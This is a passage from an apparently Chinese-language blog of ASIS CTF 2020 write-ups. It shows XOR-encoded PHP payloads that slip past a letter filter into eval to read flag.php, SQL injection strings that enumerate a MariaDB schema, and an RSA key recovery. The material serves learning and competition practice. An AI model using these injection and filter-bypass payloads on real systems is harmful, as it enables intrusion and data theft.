+Link: http://69.90.132.196:5003/?view-source</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;view-source&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;warmup&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[A-Za-z]/is&#39;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;warmup&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;warmup&#39;</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">60</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;warmup&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Try harder!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;No param given&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>從上方 source code 可以用 GET <code>/warmup=</code>，想辦法存取<code>flag.php</code>，不過限制就是無法使用英文字母以及payload長度必須小於60字元。</p>
+<p>重點在於<code>preg_match</code>繞過，關鍵字拿去查找到 <a href="https://www.cnblogs.com/v01cano/p/11736722.html" target="_blank" rel="noopener noreffer ">ctf中 preg_match 绕过技术 | 无字母数字的webshell</a>。<br>
+其中的<code>解法1</code>就是答案了，簡單講就是利用&quot;特殊字元&quot;互相XOR出&quot;字母&rdquo;，舉例來說:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;-&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>表示 <code>@</code> ^ <code>-</code> = <code>m</code>，最後只差在該如何構造出payload，畢竟我對<code>php</code>沒有到很熟 QQ
+在參考其他ctf writeup想到的解法是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span><span class="n">_</span><span class="o">=</span><span class="s1">&#39;]),&gt;&#39;</span><span class="o">^</span><span class="s1">&#39;;@@[&#39;</span><span class="p">;</span>        <span class="o">//</span> <span class="n">file</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">__</span><span class="o">=</span><span class="s1">&#39;\],::&#39;</span><span class="o">^</span><span class="s1">&#39;{;@[]&#39;</span><span class="p">;</span>     <span class="o">//</span> <span class="s1">&#39;flag</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">___</span><span class="o">=</span><span class="s1">&#39;-@-</span><span class="se">\\</span><span class="s1">&#39;</span><span class="o">^</span><span class="s1">&#39;](]{&#39;</span><span class="p">;</span>     <span class="o">//</span> <span class="n">php</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">_</span><span class="p">(</span><span class="o">$</span><span class="n">__</span><span class="o">.$</span><span class="n">___</span><span class="p">);</span>            <span class="o">//</span> <span class="n">file</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">_</span><span class="o">=</span><span class="s1">&#39;]),&gt;&#39;</span><span class="o">^</span><span class="s1">&#39;;@@[&#39;</span><span class="p">;</span><span class="o">$</span><span class="n">__</span><span class="o">=</span><span class="s1">&#39;\],::&#39;</span><span class="o">^</span><span class="s1">&#39;{;@[]&#39;</span><span class="p">;</span><span class="o">$</span><span class="n">___</span><span class="o">=</span><span class="s1">&#39;-@-</span><span class="se">\\</span><span class="s1">&#39;</span><span class="o">^</span><span class="s1">&#39;](]{&#39;</span><span class="p">;</span><span class="o">$</span><span class="n">_</span><span class="p">(</span><span class="o">$</span><span class="n">__</span><span class="o">.$</span><span class="n">___</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>無奈長度達69沒辦法繞過第二項條件。</p>
+<p>另外用 <code>$_='-@-)@]@'^'](]@.;/';$_();</code> 拼出 <code>phpinfo();</code>後可以觀察到有趣的資訊&hellip;
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618818959/blog-posts/2020-07/14-phpinfo.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1618818959/blog-posts/2020-07/14-phpinfo.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1618818959/blog-posts/2020-07/14-phpinfo.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1618818959/blog-posts/2020-07/14-phpinfo.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618818959/blog-posts/2020-07/14-phpinfo.webp"
+        title=" " /></p>
+<p>好吧好像一點也不有趣，對方伺服器擋了很多方便的系統函數，所以 @stavhaygn 也戳了不少 payload 都落空。</p>
+<p>最後拼出來的答案其實很簡單&hellip; 就是 <code>readfile('flag.php');</code><br>
+長度方面 <code>('[&gt;:@]),&gt;'^')[[$;@@[')('],::.-@-'^';@[]%00](]');</code> 為 49 ，可喜可賀。</p>
+<h2 id="web-treasury-1-unsolved">[Web] Treasury #1 (Unsolved)</h2>
+<p>從題目點開連結後畫面如下，其中 <code>AE</code> 點開會跳出小視窗顯示書本內容，而 <code>RO</code> 會開新視窗連到書本來源。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618818959/blog-posts/2020-07/14-treasury.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1618818959/blog-posts/2020-07/14-treasury.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1618818959/blog-posts/2020-07/14-treasury.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1618818959/blog-posts/2020-07/14-treasury.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618818959/blog-posts/2020-07/14-treasury.webp"
+        title=" " /></p>
+<p>我們從 <code>treasury.js</code> 可以看到抓取書本內容的方式為 <code>/books.php?type=excerpt&amp;id=xx</code> ，其中 <code>xx</code> 就對應畫面中出現的三本書 id 分別為 1, 2, 3。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618818959/blog-posts/2020-07/14-treasuryjs.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1618818959/blog-posts/2020-07/14-treasuryjs.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1618818959/blog-posts/2020-07/14-treasuryjs.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1618818959/blog-posts/2020-07/14-treasuryjs.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618818959/blog-posts/2020-07/14-treasuryjs.webp"
+        title=" " /></p>
+<p>然後、就沒有然後了。
+原因是我們顧著用整數戳 <code>id</code> ，或是想辦法找其他入口，忽略字串形式的方法（事實上我也沒戳很久就是了）。賽後看完 Writeup ，感覺自己缺少了很多這方面的瞭解，就算找到 SQLi 可能還是沒辦法戳出來QwQ</p>
+<p>以下我大概整理 <a href="https://drive.google.com/file/d/1SrkvadmPHMpK66rYfcrDDphDSQVg96et/view" target="_blank" rel="noopener noreffer ">writeup</a> 的解題思路：</p>
+<h5 id="a-確定sqli漏洞">a. 確定SQLi漏洞</h5>
+<p>透過 <code>id=1' and 1=1; --%20</code> 、 <code>id=1' and 1=2; --%20</code> ，前者成功回傳資料，後者沒有任何顯示，可知該<strong>command後面的statement成功被執行</strong>。
+P.S. 要注意 <code>--</code> 註解後要多個空白 <code>%20</code> ，否則會執行失敗</p>
+<h5 id="b-嘗試用union搭配其他sql-command">b. 嘗試用<code>UNION</code>搭配其他SQL command</h5>
+<p>從 <code>id=9' union select 'hello'; --%20</code> 發現回傳的Warning資訊是關於 <code>simplexml_load_string()</code> ，同時也間接表示可能有<code>XXE</code>的漏洞。</p>
+<h5 id="c-確認資料庫種類和版本">c. 確認資料庫種類和版本</h5>
+<p>從 <code>id=9' union select @@version; --%20</code> 瞭解資料庫為 <code>MariaDB</code> 及版本 <code>10.5.4</code> ，然後 writeup 提供 <a href="https://sqliteonline.com/" target="_blank" rel="noopener noreffer ">https://sqliteonline.com/</a> 可以線上測試資料庫指令。</p>
+<h5 id="d-逐步猜資料庫欄位">d. 逐步猜資料庫欄位</h5>
+<p>之後有點像 <code>sqlmap</code> 從已知的資訊開始把資料庫的內容還原出來，搜尋&quot;mariadb enumerate columns&quot;。<br>
+<code>select column_name from information_schema.COLUMNS where table_name='books' limit 1,1; --</code>: 其中<code>information_schema.COLUMNS</code>為一個View Table物件，另外<code>limit</code>可以限制開始位置(zero based)及列出筆數。</p>
+<h5 id="e-針對xml-structure逐步還原資料">e. 針對XML structure逐步還原資料</h5>
+<p>writeup 中是利用<code>substr(str, pos, len)</code>嘗試抓 XML 資料，從錯誤提示把 tag 慢慢拼湊起來，如下。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;book&gt;
+</span></span><span class="line"><span class="cl">&lt;id&gt;1&lt;/id&gt;
+</span></span><span class="line"><span class="cl">&lt;name&gt;blah&lt;/name&gt;
+</span></span><span class="line"><span class="cl">&lt;author&gt;blah&lt;/author&gt;
+</span></span><span class="line"><span class="cl">&lt;year&gt;blah&lt;/year&gt;
+</span></span><span class="line"><span class="cl">&lt;link&gt;blah&lt;/link&gt;
+</span></span><span class="line"><span class="cl">&lt;flag&gt;blah&lt;/flag&gt;
+</span></span><span class="line"><span class="cl">&lt;excerpt&gt;blah&lt;/excerpt&gt;
+</span></span><span class="line"><span class="cl">&lt;/book&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>concat('&lt;book&gt;&lt;excerpt&gt;',replace(info, '&lt;', ''),'&lt;/excerpt&gt;&lt;/book&gt;')</code><br>
+最後為了讓所有資訊都能完整顯示(包含tag)，writeup使用<code>cancat</code>連結所有字串 及 <code>replace('&lt;','')</code>把左角括號拿掉使tag渲染失敗，結束。</p>
+<p>至於 <strong>Treasury #2</strong> 就是接下去利用 <code>XXE</code> 撈 flag。</p>
+<h2 id="crypto-baby-rsa-unsolved">[Crypto] Baby RSA (Unsolved)</h2>
+<p>All babies love [RSA] (↓). How about you?</p>
+<div class="highlight" filename="baby_rsa.py"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flag</span> <span class="kn">import</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">nbit</span> <span class="o">=</span> <span class="mi">512</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="n">nbit</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">q</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="n">nbit</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">e</span><span class="p">,</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">65537</span><span class="p">,</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span>
+</span></span><span class="line"><span class="cl">    <span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">19</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">d</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">r</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">,</span> <span class="n">t</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">min</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">)),</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">min</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">t_p</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">s</span><span class="o">*</span><span class="n">p</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">d</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">r</span><span class="p">),</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">t_q</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">t</span><span class="o">*</span><span class="n">q</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="p">(</span><span class="n">d</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">r</span><span class="p">),</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s1">&#39;n =&#39;</span><span class="p">,</span> <span class="n">n</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s1">&#39;t_p =&#39;</span><span class="p">,</span> <span class="n">t_p</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s1">&#39;t_q =&#39;</span><span class="p">,</span> <span class="n">t_q</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s1">&#39;enc =&#39;</span><span class="p">,</span> <span class="nb">pow</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight" filename="output.txt"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">n = 10594734342063566757448883321293669290587889620265586736339477212834603215495912433611144868846006156969270740855007264519632640641698642134252272607634933572167074297087706060885814882562940246513589425206930711731882822983635474686630558630207534121750609979878270286275038737837128131581881266426871686835017263726047271960106044197708707310947840827099436585066447299264829120559315794262731576114771746189786467883424574016648249716997628251427198814515283524719060137118861718653529700994985114658591731819116128152893001811343820147174516271545881541496467750752863683867477159692651266291345654483269128390649
+</span></span><span class="line"><span class="cl">t_p = 4519048305944870673996667250268978888991017018344606790335970757895844518537213438462551754870798014432500599516098452334333141083371363892434537397146761661356351987492551545141544282333284496356154689853566589087098714992334239545021777497521910627396112225599188792518283722610007089616240235553136331948312118820778466109157166814076918897321333302212037091468294236737664634236652872694643742513694231865411343972158511561161110552791654692064067926570244885476257516034078495033460959374008589773105321047878659565315394819180209475120634087455397672140885519817817257776910144945634993354823069305663576529148
+</span></span><span class="line"><span class="cl">t_q = 4223555135826151977468024279774194480800715262404098289320039500346723919877497179817129350823600662852132753483649104908356177392498638581546631861434234853762982271617144142856310134474982641587194459504721444158968027785611189945247212188754878851655525470022211101581388965272172510931958506487803857506055606348311364630088719304677522811373637015860200879231944374131649311811899458517619132770984593620802230131001429508873143491237281184088018483168411150471501405713386021109286000921074215502701541654045498583231623256365217713761284163181132635382837375055449383413664576886036963978338681516186909796419
+</span></span><span class="line"><span class="cl">enc = 5548605244436176056181226780712792626658031554693210613227037883659685322461405771085980865371756818537836556724405699867834352918413810459894692455739712787293493925926704951363016528075548052788176859617001319579989667391737106534619373230550539705242471496840327096240228287029720859133747702679648464160040864448646353875953946451194177148020357408296263967558099653116183721335233575474288724063742809047676165474538954797346185329962114447585306058828989433687341976816521575673147671067412234404782485540629504019524293885245673723057009189296634321892220944915880530683285446919795527111871615036653620565630
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>題目給了一份 <code>code</code> 和 <code>output.txt</code>，要求把 <code>flag</code> 推出來。</p>
+<p>看起來還算是個資訊很多的crypto題，所以我一開始完全忽略 line 18 - 20，只想著能不能從 <code>output.txt</code> 把 flag 拼出來。後來也發現 <code>n</code> 根本沒辦法透過 <a href="http://www.factordb.com/index.php" target="_blank" rel="noopener noreffer ">factordb.com</a> 拆成<code>p</code>, <code>q</code>，某方面來說也是蠻現實的題目：給予密文<code>enc</code>、公鑰<code>(e, n)</code>，不過多了奇怪的線索<code>t_p</code>, <code>t_q</code>。</p>
+<p>參考 <a href="https://github.com/networknerd/CTF_Writeups/blob/master/2020/ASISCTF_2020/Crypto/BabyRSA/README.md" target="_blank" rel="noopener noreffer ">writeup</a></p>
+<p>前半部 <code>While</code> 是標準的 <code>RSA</code> ，從 writeup 來看關鍵就在 line 18 - 20&hellip; 嗯、聽起來是廢話，但我當初忽略的原因在於 line 18 的 <code>s</code>, <code>t</code> 完全是透過 <code>p</code>, <code>q</code> 隨機出來的數字，就算知道 <code>n</code> 可以間接固定 <code>p</code> , <code>q</code> ，但在爆不出來的情況下更遑論推出 <code>d</code>，所以花了很多時間在亂推式子 ==</p>
+<p>真正的關鍵點在line 19: <code>t_p = pow(s*p + 1, (d-1)/(1 &lt;&lt; r), n)</code>，在已經知道 $t_p$ 的前提可以整理如下:</p>
+<p>$$t_p = (s*p + 1) ^ {(d-1)/(1&laquo;r)}$$</p>
+<p>再來writeup說明算式右邊部分除了 $1$ 以外都可以被 $p$ 整除，我自己最後的理解如下。
+令 $x = s * p$ ，在 $(x + 1) ^ k$ 的情況下把 $k$ 用 $2, 3$ 代入看看：</p>
+<p>$$(x+1)^2 = x^2 + 2*x*1 + 1^2$$</p>
+<p>$$(x+1)^3 = x^3 + 3*x^2*1^1 + 3*x^1*1^2 + 1^3$$</p>
+<p>根據上述兩式，若 $x$ 能夠被 $p$ 整除，那會得到 $(x+1)^k = 1\ mod\ p $，回到原式可知
+$$t_p\ mod\  p = (s*p + 1) ^ {(d-1)/(1&laquo;r)}\ mod\  p = 1 ， \therefore t_p = 1\ mod\ p$$</p>
+<p>這下我們可以確定 $t_p-1$ 是 $p$ 的倍數，同時由於 $n=p*q$ ， $n$ 也是 $p$ 的倍數，剩下就好辦了~</p>
+<p>↓ 直接照搬code（懶） ↓</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">gcd</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">n</span> <span class="o">=</span> <span class="p">{</span><span class="n">blah</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">t_p</span> <span class="o">=</span> <span class="p">{</span><span class="n">blah</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">enc</span> <span class="o">=</span> <span class="p">{</span><span class="n">blah</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">p</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="n">t_p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">q</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="n">p</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="k">assert</span> <span class="n">n</span> <span class="o">==</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">phi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="sa">b</span><span class="s1">&#39;ASIS</span><span class="si">{baby___RSA___f0r_W4rM_uP}</span><span class="s1">&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="miscforensics-adventure">[Misc][Forensics] Adventure</h2>
+<p>Time plays a role in almost every decision. And some decisions define your attitude about time.
+Can you [README.txt]? It&rsquo;s time for a new adventure!</p>
+<p>Note: Slow-download is international and part of the task.</p>
+<p>題目給定下載連結，印象中好像有到 4G bytes，然後你會發現下載超慢還會斷XDD
+然後我就傻傻的一直給他按下載丟著讓他跑，想當然爾沒有結果~</p>
+<p>看完 <a href="https://ctftime.org/writeup/22113" target="_blank" rel="noopener noreffer ">writeup</a> 才發覺這題其實還蠻好玩der !!</p>
+<p>如果有時間希望可以在這裡補完自己摸過之後的想法 &gt;&lt;</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-07-14</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/posts/2020/asisctf-qual-2020/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/asis-ctf/">ASIS CTF</a>,&nbsp;<a href="/tags/%E5%BF%83%E5%BE%97%E5%88%86%E4%BA%AB/">心得分享</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2020/ais3-2020-preexam-writeups/" class="prev" rel="prev" title="[Writeup] AIS3 2020 Pre-exam "><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>[Writeup] AIS3 2020 Pre-exam </a>
+            <a href="/posts/2020/2020-summer-conf-p1/" class="next" rel="next" title="[Sharing] 2020 Summer Conf. PART 1">[Sharing] 2020 Summer Conf. PART 1<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
